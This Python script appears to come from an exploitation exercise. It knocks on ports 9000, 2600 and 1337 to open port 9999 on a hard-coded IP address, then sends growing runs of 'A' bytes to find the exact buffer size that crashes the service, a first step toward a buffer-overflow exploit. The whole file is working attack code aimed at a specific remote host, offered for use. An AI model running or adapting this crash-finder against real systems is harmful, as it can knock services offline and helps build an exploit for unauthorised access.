#!/usr/bin/env python3
"""
Find the exact buffer size that causes a crash
"""

import socket
import time

target_ip = "13.206.58.35"
target_port = 9999

def knock_first():
    """Knock to open port 9999"""
    sequence = [9000, 2600, 1337]
    for port in sequence:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.2)

def test_size(size):
    """Test a specific buffer size"""
    try:
        knock_first()
        time.sleep(0.8)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target_ip, target_port))
        
        # Receive banner
        banner = sock.recv(4096)
        
        # Send payload
        payload = b"A" * size + b"\n"
        sock.send(payload)
        
        # Try to receive response
        try:
            response = sock.recv(4096)
            resp_text = response.decode('utf-8', errors='ignore')
            
            if "denied" in resp_text.lower():
                result = "NORMAL"
            else:
                result = "UNUSUAL"
            
            sock.close()
            return result
            
        except socket.timeout:
            sock.close()
            return "TIMEOUT"
        except Exception as e:
            return "CRASH"
        
    except Exception as e:
        return "CONN_ERROR"

print("[*] Finding exact buffer size...")
print("[*] Testing range 100-250 bytes\n")

# Binary search for the exact crash point
for size in range(100, 250, 10):
    result = test_size(size)
    print(f"Size {size:3d}: {result}")
    
    if result in ["CRASH", "TIMEOUT"]:
        print(f"\n[!] Crash detected around {size} bytes")
        print(f"[*] Fine-tuning...")
        
        # Fine-tune
        for fine_size in range(max(100, size-10), size+10):
            fine_result = test_size(fine_size)
            print(f"  Size {fine_size:3d}: {fine_result}")
            
            if fine_result in ["CRASH", "TIMEOUT"] and test_size(fine_size-1) == "NORMAL":
                print(f"\n[!!!] EXACT BUFFER SIZE: {fine_size} bytes")
                break
        break
    
    time.sleep(1)

print("\n[*] Complete")
